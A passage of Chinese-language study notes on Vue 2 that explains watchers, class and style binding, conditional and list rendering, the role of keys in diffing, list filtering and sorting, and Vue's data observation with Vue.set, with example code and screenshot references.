        名：<input type="text" v-model="lastName"> <br/>
        全名：<span>{{fullName}}</span>
```

```js
            data: {
                firstName: '张',
                lastName: '三',
                fullName: '张-三'
            },
            watch: {
                firstName(newFirstName){
                    setTimeout(() => {
                        this.fullName = newFirstName + '-' + this.lastName
                    }, 1000);
                },
                lastName(newLastName){
                    this.fullName = this.firstName + '-' + newLastName
                }
            }
```

​	这里的代码是用监视属性watch实现的，监视属性可以进行一些异步操作（如设置定时器），但是我们必须知道定时器的回调函数（下图的红色框）由`window`所管理，它不隶属Vue管理

![image-20230307194816493](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307194816493.png)

​	如果我们将定时器的回调函数写成普通函数，那么下面语句中的`this`将不再是`vm`，下面的语句就无法顺利执行

```javascript
            watch: {
                firstName(newFirstName){
                    setTimeout(function(){
                      	console.log(this)
                        this.fullName = newFirstName + '-' + this.lastName
                    }, 1000);
                },
                lastName(newLastName){
                    this.fullName = this.firstName + '-' + newLastName
                }
            }
```

调试结果：

![image-20230307195057284](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307195057284.png)

如果我们写成箭头函数，由于箭头函数没有自己的`this`，它会往外查找`firstName`这个函数所对应的this指向，而`firstName`的指向为`vm`，我们才能在下面的`this.fullName`中拿到`data`里面的相关属性

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307195339204.png" alt="image-20230307195339204" style="zoom:50%;" />

## 1.14 绑定样式

1. class样式

   写法：`class=xxx` 可以是字符串、对象、数组

   ​	字符串写法适用于：类名不确定，要动态获取

   ​	对象写法适用于：要绑定多个样式，个数不确定，名字也不确定

   ​	数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用

2. style样式

   `style="{{fontSize: xxx}}"`其中xxx是动态值

   `style="[a, b]"`其中a、b是样式对象

### 1.14.1 绑定class样式

​	绑定class样式\--共有三种写法

1. 绑定class样式\--字符串写法，适用于样式的类名不确定，需要动态指定时

```css
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .happy {
            border: 4px solid red;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }
        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal {
            background-color: skyblue;
        }
```

<div class="basic" v-bind:class="mood" @click="changeMood">{{name}}</div>

```javascript
            data: {
                name: 'qifei',
                mood: 'normal',
            },
            methods: {
                changeMood(){
                    const arr = ['happy', 'sad', 'normal']
                    this.mood = arr[Math.floor(Math.random() * 3)]
                }
            }
```

可以实现点击随机切换的效果

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307205441060.png" alt="image-20230307205441060" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307205453205.png" alt="image-20230307205453205" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307205506528.png" alt="image-20230307205506528" style="zoom:50%;" />

2. 绑定class样式--数组写法，适用于要绑定的样式个数不确定、名字也不确定时

下面的三个样式随便选 个数随便排布

```css
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .atguigu1 {
            background-color: yellowgreen;
        }
        .atguigu2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }
        .atguigu3 {
            border-radius: 20px;
        }
```



```html
<div class="basic" v-bind:class="classArr">{{name}}</div>
```

```javascript
classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307205928118.png" alt="image-20230307205928118" style="zoom:50%;" />

3. 绑定class样式--对象写法，适用于要绑定的样式个数确定、名字也确定，但要动态决定用不用时

​	随着属性的布尔值的改变决定用于不用

```css
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .atguigu1 {
            background-color: yellowgreen;
        }
        .atguigu2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }
```

```html
<div class="basic" v-bind:class="classObj">{{name}}</div>
```

```javascript
                classObj: {
                    atguigu1: false,
                    atguigu2: true
                }
```

​	如图发现布尔值为true的atguigu2成功应用上样式

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230307210128286.png" alt="image-20230307210128286" style="zoom:50%;" />

### 1.14.2 绑定style样式

1. 绑定style样式--对象写法

```css
.basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
```

```html
<div class="basic" v-bind:style="styleObj">{{name}}</div>
```

data里面的配置项：

```javascript
								styleObj: {
                    fontSize: 40 + 'px',
                    color: 'red',
                },
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309185814043.png" alt="image-20230309185814043" style="zoom:50%;" />

2. 绑定style样式--数组写法

```css
.basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
```

```html
<div class="basic" v-bind:style="[styleObj1, styleObj2]">{{name}}</div>
```

​	这里将多个对象存入内联样式的数组中并交给vue管理

```javascript
								styleObj: {
                    fontSize: 40 + 'px',
                    color: 'red',
                },
                styleObj2: {
                    backgroundColor: 'orange'
                }
```

![image-20230309185901264](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309185901264.png)

​	由此可见，两个存在data里的对象全部生效

**完整程序代码：**

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>绑定样式</title>
    <script src="../js/vue.js"></script>
    <style>
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .happy {
            border: 4px solid red;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }
        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal {
            background-color: skyblue;
        }


        .atguigu1 {
            background-color: yellowgreen;
        }
        .atguigu2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }
        .atguigu3 {
            border-radius: 20px;
        }
    </style>
</head>

<body>
    <div id="root">
        <!-- 绑定class样式--字符串写法，适用于样式的类名不确定，需要动态指定时 -->
        <div class="basic" v-bind:class="mood" @click="changeMood">{{name}}</div>
        <br/>
        <br/>
        <br/>

        <!-- 绑定class样式--数组写法，适用于要绑定的样式个数不确定、名字也不确定时 -->
        <div class="basic" v-bind:class="classArr">{{name}}</div>

        <!-- 绑定class样式--对象写法，适用于要绑定的样式个数确定、名字也确定，但要动态决定用不用时 -->
        <div class="basic" v-bind:class="classObj">{{name}}</div>
        <br/>

        <!-- 绑定style样式--对象写法 -->
        <div class="basic" v-bind:style="styleObj">{{name}}</div>
        <!-- 绑定style样式--数组写法 -->
        <div class="basic" v-bind:style="[styleObj, styleObj2]">{{name}}</div>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'qifei',
                mood: 'normal',
                classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
                classObj: {
                    atguigu1: false,
                    atguigu2: true
                },
                styleObj: {
                    fontSize: 40 + 'px',
                    color: 'red',
                },
                styleObj2: {
                    backgroundColor: 'orange'
                }
            },
            methods: {
                changeMood(){
                    const arr = ['happy', 'sad', 'normal']
                    this.mood = arr[Math.floor(Math.random() * 3)]
                }
            }
        })
    </script>
</body>

</html>
```

## 1.15 条件渲染

​	条件渲染一般有两条指令可供使用：

 1. `v-if`

    ​	写法：

    		1. `v-if='表达式'`
    		1. `v-else-if='表达式`'
    		1. `v-else='表达式'`

    适用于：切换频率较低的场景

    特点：不展示的DOM元素直接删除

    注意：`v-if`可以和`v-else-if`、`v-else`一起使用，但要求结构不能被“打断”

    

​	当我们使用v-if时，如果其值直接为false，则我们可能在此页面中无法找到该元素

```html
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        

        <!-- 用v-if做条件渲染 -->
        <h2 v-if="false">我是{{name}}</h2>
        <h2 v-if="1 === 1">我是{{name}}</h2>


    </div>
```

```javascript
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'czq',
                n: 0
            }
        })
```

当其值为true时：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309195649314.png" alt="image-20230309195649314" style="zoom:50%;" />

当其值为false时：

```html
<h2 v-if="false">我是{{name}}</h2>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309195749196.png" alt="image-20230309195749196" style="zoom:50%;" />

我们则完全无法在页面中找到此元素

`v-if`和`v-else`和`v-else-if`的逻辑与普通的`if`、`else`、`else-if`相同，使用时请注意思考

且两个`v-if`和`v-elseif`中不能插入其他语句，否则会引起其他的`v-if`无法判断

```html
<div id="root">
  			<h2>当前n的值是:{{n}}</h2>
  			<button @click="n++">点我n+1</button>
  			<div v-if="n === 1">Angular</div>
        <div v-else-if="n === 2">React</div>
  			<!-- 如果我们在此插入不对应的其他元素则会引起编译错误 -->
  			<div>@</div>
        <div v-else-if="n === 3">Vue</div>
        <div v-else>哈哈</div>
</div>
```

```javascript
const vm = new Vue({
            el: '#root',
            data: {
                name: 'czq',
                n: 0
            }
        })
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309200443192.png" alt="image-20230309200443192" style="zoom:50%;" />

**补充：当我们不得不批量操作元素时候，通常会选择将其包在一个特定的容器中，但是问题在于我们如果这样做就会导致结构被破坏，template则会为我们完美的解决这个问题，它会在我们成功进行批量操作之后，在挂载页面的时候自动消失 但是要注意只能`v-if`才能配合它**

```html
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
				<template v-if='n === 1'>
            <h2>捞</h2>
            <h2>逊</h2>
            <h2>逆天</h2>
        </template>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309200823884.png" alt="image-20230309200823884" style="zoom:50%;" />

我们会发现 在挂在页面的元素之中，三个`h2`并没有被包裹住

2. `v-show`

​		写法：`v-show=表达式`

​		适用于：切换频率较高的场景

​		特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

​		

```html
    <div id="root">

        <!-- 使用v-show做条件渲染 -->
        <h2 v-show="true">我是{{name}}</h2>

    </div>
```

```javascript
const vm = new Vue({
            el: '#root',
            data: {
                name: 'czq',
                
            }
        })
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309201248223.png" alt="image-20230309201248223" style="zoom:50%;" />

当其值为false时：

```html
        <h2 v-show="false">我是{{name}}</h2>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309201340633.png" alt="image-20230309201340633" style="zoom:50%;" />

​	由此可见，`v-show`底层是通过操作`display`这个属性实现的

3. 备注：使用`v-if`时，元素可能无法获取到，而使用`v-show`一定可以获取到

​	这在前面`v-if`值为false，`v-show`的值为false的调试结果可以印证

**本节完整代码：**

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>条件渲染</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>

        <!-- 使用v-show做条件渲染 -->
        <h2 v-show="false">我是{{name}}</h2>
        <!-- <h2 v-show="1 === 1">我是{{name}}</h2> -->

        <!-- 用v-if做条件渲染 -->
        <h2 v-if="false">我是{{name}}</h2>
        <h2 v-if="1 === 1">我是{{name}}</h2>

        <div v-if="n === 1">Angular</div>
        <div v-else-if="n === 2">React</div>
        <div>@</div>
        <div v-else-if="n === 3">Vue</div>
        <div v-else>哈哈</div>

        <!-- v-if与template的配合 -->
        <template v-if='n === 1'>
            <h2>捞</h2>
            <h2>逊</h2>
            <h2>逆天</h2>
        </template>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'czq',
                n: 0
            }
        })
    </script>
</body>

</html>
```

## 1.16 列表渲染

### 1.16.1 基本列表

需求：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309210631075.png" alt="image-20230309210631075" style="zoom:50%;" />

​	一般我们要定义人员信息，都会将其放在li这种顺序列表中，将每个人的信息以对象的方式存入一个数组中将其遍历放到li中

​	我们可以用 `v-for` 指令基于一个数组来渲染一个列表。`v-for` 指令需要使用 `item in items` 形式的特殊语法，其中 `items` 是源数据数组，而 `item` 则是被迭代的数组元素的**别名**。

​	`v-for`指令

	1. 用于展示列表数据
	1. 语法：`v-for="(item, index)  in xxx" :key="yyy"`
	1. 可遍历：数组、对象、字符串（用的很少）、指定次数遍历（用的很少）

**用`v-for`遍历数组：**

​	我们可以用 `v-for` 指令基于一个数组来渲染一个列表。`v-for` 指令需要使用 `item in items` 形式的特殊语法，其中 `items` 是源数据数组，而 `item` 则是被迭代的数组元素的**别名**。

```html
    <div id="root">
        <h2>人员列表</h2>
        <ul>
            <!-- 遍历数组 -->
            <li v-for="(person, index) in persons" :key="person.id">
                {{person.name}}-{{person.age}}-{{index}}
            </li>
        </ul>
     </div>
```

```javascript
        const vm = new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: 001, name: '张三', age: 18 },
                    { id: 002, name: '李四', age: 19 },
                    { id: 003, name: '王五', age: 18 }
                ],
            }
        })
```

在这里，`key`的指定尤为重要，其将会作为遍历生成的每一个li的标识符

调试结果如下：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230309211349763.png" alt="image-20230309211349763" style="zoom:50%;" />

**用`v-for`遍历对象**

```html
        <h2>汽车信息</h2>
        <ul>
            <!-- 遍历对象 -->
            <ul>
                <li v-for="(val, key, index) in carMessage" :key="key">{{key}}-{{val}}-{{index}}</li>
            </ul>
        </ul>
```

```javascript
                carMessage: {
                    name: '奥迪A8',
                    price: 700000,
                    color: 'black',
                },
```

​	调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310193021888.png" alt="image-20230310193021888" style="zoom:50%;" />

​	**用`v-for`遍历字符串：**

```html
        <h2>测试遍历字符串</h2>
        <!-- 遍历字符串 -->
        <ul>
            <li v-for="(char, index) in str" :key="index">{{char}}-{{index}}</li>
        </ul>
```

```javascript
str: 'hello'
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310193231151.png" alt="image-20230310193231151" style="zoom:50%;" />

**用`v-for`指定次数遍历：**

```html
        <h2>测试遍历指定次数</h2>
        <!-- 遍历制定次数 -->
        <ul>
            <li v-for="(number, index) in 5" :key="index">{{number}}-{{index}}</li>
        </ul>
```

第一个参数是遍历的次数，第二个则为索引值

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310193404291.png" alt="image-20230310193404291" style="zoom:50%;" />

### 1.16.2 key的原理和重要作用

​	当我们在页面遍历数组以及其他元素的时候，通常Vue会让我们定义一个`key`，这个`key`都会当做唯一标识被Vue用`diffing算法`进行高效的工作 当我们使用`index`或者用户唯一标识`id`的时候，这两者有什么区别呢？

需求：在人员列表中添加一个老刘，需要让其信息放在最前面，其他人的信息往后推，并在后面生成文本框编辑信息后再进行添加信息操作

**遍历列表时以`index`作为`key`**

```html
    <div id="root">
        <h2>人员列表</h2>
        <button @click.once="add">添加一个老刘</button>
        <ul>
            <!-- 遍历数组 -->
            <li v-for="(person, index) in persons" :key="index">
                {{person.name}}-{{person.age}}-{{index}}
                <input type="text">
            </li>
        </ul>
    </div>
```

```javascript
        const vm = new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: 001, name: '张三', age: 18 },
                    { id: 002, name: '李四', age: 19 },
                    { id: 003, name: '王五', age: 18 }
                ],

            },
            methods: {
                add(){
                    const person = {id: 004, name: '老刘', age: 40}
                    this.persons.unshift(person)
                }
            },
        })
```

呈现在页面上的效果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310200910659.png" alt="image-20230310200910659" style="zoom:50%;" />

由于用户操作的是真实DOM，当用户在页面上留下信息的时候，信息就会残留在真实DOM上，而在渲染页面的时候，Vue会在中间生成虚拟DOM，页面更新时，Vue会根据`diffing算法`对比更新前后的每个节点来决定是否复用更新前的元素用以提升效率，当我们用`index`作为Vue要使用的`key`时

​	![image-20230310201259891](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310201259891.png)

​	Vue会对比两个`key`相同的元素以及里面的子节点，这里面新增的老刘`key`为0，初始的虚拟DOM中`key`也为0的是张三，根据`diffing算法`这部分需要重新生成并渲染到页面中。后面`key`为1的张三完全可以在初始虚拟DOM找到，这会导致严重的效率问题

​	而后面的input框，由于`diffing算法`对比的两个虚拟DOM完全一致，Vue会复用初始虚拟DOM的input框，若用户在页面更新之前在input中输入数据，在页面更新之后，会造成无法容忍的错误：**数据混乱**

页面更新前：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310201747085.png" alt="image-20230310201747085" style="zoom:50%;" />

页面更新后：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310201831717.png" alt="image-20230310201831717" style="zoom:50%;" />

我们发现数据已经错乱了，所以当我们添加的数据会打乱原本列表的顺序是，是不可以用`index`作为Vue所管理的`key`的

但是如果是将老刘添加在后面的时候，由于三个老数据的`key`值没变，所以不会出现降低效率以及数据错乱的问题

**遍历列表时以`唯一标识符（如id）`作为`key`**

```html
<!-- 遍历数组 -->
            <li v-for="(person, index) in persons" :key="person.id">
                {{person.name}}-{{person.age}}-{{index}}
                <input type="text">
            </li>
```

由于我们使用了唯一的标识符，`id`为004的老刘将会作为列表的第一个添加进原有的列表中，且其`key`为004，其他三位的`key`由于也用了唯一的`id`，则没有影响其原来的`key`值

Vue会根据`key`进行新旧虚拟DOM的比较，无论我们把老刘放在哪儿，由于老数据张三李四王五的`key`没变，又因为其子节点数据完全一致，Vue会复用其节点，只会新增一个`key`为004的老刘

且由于老刘是新增进页面的节点，其input框是新生成的，不会出现用户在真实DOM残留的数据错乱的情况

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310202824166.png" alt="image-20230310202824166" style="zoom:50%;" />

页面更新前：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310202911689.png" alt="image-20230310202911689" style="zoom:50%;" />

页面更新后：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230310202932321.png" alt="image-20230310202932321" style="zoom:50%;" />

在这个案例中，以`唯一标识符`作为`key`效率得到了提升，也不会有数据错乱的问题。

**小结：**

​	面试题：react、vue中的key有什么作用？（key的内部原理）

		1. 虚拟DOM中key的作用：

​		key是虚拟DOM对象的标识，当状态中的数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则：

   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：

      1. 若虚拟DOM中内容没变，直接使用之前的真实DOM
      2. 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM

   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key：

      ​	创建新的真实DOM，随后渲染到页面

3. 用index作为key可能会引发的问题：

   1. 若对数据进行：逆序添加、逆序删除等破坏顺序的操作时：

      ​	会产生没有必要的真实DOM更新 ==> 页面效果没问题，但效率低

   2. 若结构中还包含输入类的DOM：

      ​	会产生错误的DOM更新 ==> 页面效果有问题

4. 开发中如何选择key？

   1. 最好使用每条数据的唯一标识符作为key，比如id、手机号、身份证号、学号等唯一值
   2. 若不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表用于展示，使用index作为key是没问题的

### 1.16.3 列表过滤

​	需求：我们会将一整个列表按照名字进行模糊搜索

​	搜索前：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311175216882.png" alt="image-20230311175216882" style="zoom:50%;" />

搜索后：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311175242258.png" alt="image-20230311175242258" style="zoom:50%;" />

```html
    <div id="root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <!-- 遍历数组 -->
            <!-- <li v-for="(person, index) in persons" :key="person.id">
                {{person.name}}-{{person.age}}-{{person.sex}}
            </li> -->
            <li v-for="(filledPerson, index) in filledPersons" :key="filledPerson.id">
                {{filledPerson.name}}-{{filledPerson.age}}-{{filledPerson.sex}}
            </li>
        </ul>
    </div>
```

在这里我们需要对原数组persons进行过滤，用`filter`方法过滤并生成符合条件的新数组，我们将其命名为filteredPersons

由于我们的关注点是keyWord这个属性的变化，所以我们可以用watch和computed两个写法实现

**用watch监视keyWord实现：**

```javascript
        // 用watch实现
        const vm = new Vue({
            el: '#root',
            data: {
                keyWord: '',
                persons: [
                    { id: 001, name: '马冬梅', age: 18, sex: '女' },
                    { id: 002, name: '周冬雨', age: 19, sex: '女' },
                    { id: 003, name: '周杰伦', age: 18, sex: '男' },
                    { id: 004, name: '温兆伦', age: 18, sex: '男' }
                ],
                filteredPersons: []
            },
            watch: {
                keyWord: {
                    //由于任何字符串都包含了空字符串，为了让一开始显示所有列表，所以配置了立即执行一次
                    immediate: true,
                    handler(newVal) {
                        this.filteredPersons = this.persons.filter((person) => {
                            // filter的第一个参数为被过滤数组的每一项
                            // return后面接的是筛选条件
                            return person.name.indexOf(newVal) !== -1
                        })
                    }
                }
            }
        })
```

为什么我们不用watch的简写？

如果我们不需要配置watch的其他配置项的话，我们可以省略`handler`函数并把我们监视的属性直接写成一个函数`keyWord(){}`

由于这里监视的是`keyWord`，当我们将其改变的时候，就会执行这个方法，当我们第一次刷新页面的时候，这个函数无法执行，则会引起没有`filteredPersons`数组为空，页面没有东西

没有配置`immediate`属性时：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311180336705.png" alt="image-20230311180336705" style="zoom:50%;" />

这样不符合我们的需求 所以我们需要用到`immediate`这个配置项，要其在页面挂在的时候，`handler`立即执行一次。所以我们不能简写，要写完整的watch

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311180526348.png" alt="image-20230311180526348" style="zoom:50%;" />

![image-20230311180543872](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311180543872.png)

**用computed计算keyWord实现：**

```javascript
        // 用computed实现
        const vm = new Vue({
            el: '#root',
            data: {
                keyWord: '',
                persons: [
                    { id: 001, name: '马冬梅', age: 18, sex: '女' },
                    { id: 002, name: '周冬雨', age: 19, sex: '女' },
                    { id: 003, name: '周杰伦', age: 18, sex: '男' },
                    { id: 004, name: '温兆伦', age: 18, sex: '男' }
                ],
            },
            computed: {
                filledPersons(){ 
                    // 第一个return是计算属性的get需要的 第二个是filter这个方法需要的过滤条件
                    return this.persons.filter((person) => {
                        return person.name.indexOf(this.keyWord) !== -1
                    })
                }
            }
        })
```

​	在`computed`计算属性中，里面的getter是在第一次挂在页面以及`keyWord`的每一次变化的时候执行，所以它会在页面一挂在就显示

​	但是值得注意的是，`computed`中的`getter`可不像`watch`中的`handler()`可以使用`newValue`，所以我们`indexOf()`中对比的字符串则是我们每次变化的`keyWord`

​	还有需要注意`getter`的`return`（返回给filteredPerson的元素）与`filter`的return（过滤条件）

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311181329044.png" alt="image-20230311181329044" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311181343803.png" alt="image-20230311181343803" style="zoom:50%;" />

由此更有力证明了，当watch和computed都可以实现时，用computed计算属性更简便

### 1.16.4 列表排序

需求：根据年龄对人员列表进行排序，过滤后的列表也可以完成排序

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311185349446.png" alt="image-20230311185349446" style="zoom:50%;" />

```html
    <div id="root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click="sortType = 'up'">年龄升序</button>
        <button @click="sortType = 'down'">年龄降序</button>
        <button @click="sortType = 'origin'">原顺序</button>
        <ul>
            <li v-for="(filteredPerson, index) in filteredPersons" :key="filteredPerson.id">
                {{filteredPerson.name}}-{{filteredPerson.age}}-{{filteredPerson.sex}}
            </li>
        </ul>
    </div>
```

我们要想排序，得知道用户的点击行为，所以我们在data中新配置了一个属性`sortType`以区分升降序以及原排序

```javascript
            data: {
                keyWord: '',
                sortType: 'origin', //排序类型
                persons: [
                    { id: 001, name: '马冬梅', age: 18, sex: '女' },
                    { id: 002, name: '周冬雨', age: 19, sex: '女' },
                    { id: 003, name: '周杰伦', age: 23, sex: '男' },
                    { id: 004, name: '温兆伦', age: 22, sex: '男' }
                ],
            },
```

我们需要先过滤，再排序 所以我们不着急返回，我们可以拿一个变量接住过滤后的数组，再将这个数组进行排序， 需要用到排序数组的`sort`方法 。由于`sort`方法会改变原数组，所以我们可以直接将排序后的数组当成返回值放给`filteredPersons` 

```javascript
            computed: {
                filteredPersons() {
                    // 第一个return是计算属性的get需要的 第二个是filter这个方法需要的过滤条件
                    const arr = this.persons.filter((person) => {
                        return person.name.indexOf(this.keyWord) !== -1
                    })
                    // 判断一下是否需要排序
                    if (this.sortType !== 'origin') {
                        if (this.sortType !== 'down') {
                            arr.sort((a, b) => {
                                return a.age - b.age
                            })
                        } else {
                            arr.sort((a, b) => {
                                return b.age - a.age
                            })
                        }
                    }
                    return arr
                }
            }
```

**扩展：简略了解排序数组的sort方法：**

```javascript
// 箭头函数
sort((a, b) => { /* … */ } )
```

参数：

`a`：第一个用于比较的元素。

`b`：第二个用于比较的元素。

返回值为排序后的数组。请注意，数组已原地排序，并且不进行复制。

`retrun a - b`则是升序 `return b - a`则是降序

```javascript
const numbers = [4, 2, 5, 1, 3];
numbers.sort(function (a, b) {
  return a - b;
});
console.log(numbers);
// [1, 2, 3, 4, 5]

// 或者

const numbers2 = [4, 2, 5, 1, 3];
numbers2.sort((a, b) => a - b);
console.log(numbers2);
// [1, 2, 3, 4, 5]

```



列表排序案例调试结果：

​	升序：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311190336552.png" alt="image-20230311190336552" style="zoom:50%;" />

降序：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311190403232.png" alt="image-20230311190403232" style="zoom:50%;" />

搜索后降序：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230311190437509.png" alt="image-20230311190437509" style="zoom:50%;" />

原顺序则为开头的场景

### 1.16.5 Vue监测data中的数据

先来个案例引入一下：

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul> 
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'马冬梅',age:30,sex:'女'},
                {id:'002',name:'周冬雨',age:31,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
        },
        methods: {
            updateMei(){
                // this.persons[0].name = '马老师' //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = '男' //奏效
                this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                // this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
            }
        }
    }) 

</script>

```

点击更新马冬梅的信息，马冬梅的数据并没有发生改变。

![image-20230313152729229](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313152729229.png)

我们来看看控制台：

![image-20230313152813061](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313152813061.png)

控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。

所以我们来研究一下 Vue 监测的原理。

我们先研究**Vue 如何监测对象里的数据**

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            name:'浙江师范大学',
            address:'金华',
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                friends:[
                    {name:'jerry',age:35}
                ]
            }
        }
    })
</script>

```

![image-20230313152845241](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313152845241.png)

```
讲一下解析模板后面的操作→ 调用 set 方法时，就会去解析模板----->生成新的虚拟 DOM----->新旧DOM 对比 -----> 更新页面
```

```html
<script type="text/javascript" >

    let data = {
        name:'尚硅谷',
        address:'北京',
    }

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)		
    console.log(obs)	

    //准备一个vm实例对象
    let vm = {}
    vm._data = data = obs

    function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get() {
                    return obj[k]
                },
                set(val) {
                    console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                    obj[k] = val
                }
            })
        })
    }
</script>

```

![image-20230313152909619](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230313152909619.png)

### 1.16.6 Vue.set的使用

```javascript
Vue.set(target, propertyName/index, value) 或
vm.$set(target, propertyName/index, value)
```

**用法：**

​	向响应式对象中添加一个`property`，并确保这个新`property`同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新`property`，因为Vue无法探测普通的新增`property`（比如`vm.myObject.newProperty = 'hi'`）

代码：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
